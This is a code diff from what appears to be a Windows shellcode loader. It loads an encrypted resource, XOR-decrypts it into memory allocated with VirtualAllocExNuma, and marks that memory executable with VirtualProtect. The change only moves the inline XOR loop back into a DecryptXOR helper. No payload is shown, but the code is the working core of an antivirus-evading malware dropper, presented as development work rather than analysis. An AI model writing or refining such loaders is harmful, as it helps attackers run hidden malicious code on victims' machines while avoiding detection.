@@ -24,11 +24,11 @@ void DataLoadBaby(const char* resName, char** data, DWORD* size) {
 
 
 
-//void DecryptXOR(char* codeboy, DWORD codeboyLen, unsigned char* key, DWORD keyLen) {
-    //for (DWORD i = 0; i < codeboyLen; i++) {
-        //codeboy[i] ^= key[i % keyLen]; // XOR with the key in a repeating fashion
-    //}
-//}
+void DecryptXOR(char* codeboy, DWORD codeboyLen, unsigned char* key, DWORD keyLen) {
+    for (DWORD i = 0; i < codeboyLen; i++) {
+        codeboy[i] ^= key[i % keyLen]; // XOR with the key in a repeating fashion
+    }
+}
 
 
 int main() {
@@ -44,10 +44,8 @@ int main() {
 
     LPVOID memalo = VirtualAllocExNuma(GetCurrentProcess(), NULL, AESCodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
     //dhanushaes(AESCode, AESCodeLen, AESkey, AESkeyLen);
-    //DecryptXOR(AESCode, AESCodeLen, AESkey , AESkeyLen);
-    for (DWORD i = 0; i < AESCodeLen; i++) {
-        AESCode[i] ^= AESkey[i % AESkeyLen];
-    }
+    DecryptXOR(AESCode, AESCodeLen, AESkey , AESkeyLen);
+    
     memcpy(memalo, AESCode, AESCodeLen);
     DWORD oldProtect;
     VirtualProtect(memalo, AESCodeLen, PAGE_EXECUTE_READ, &oldProtect);
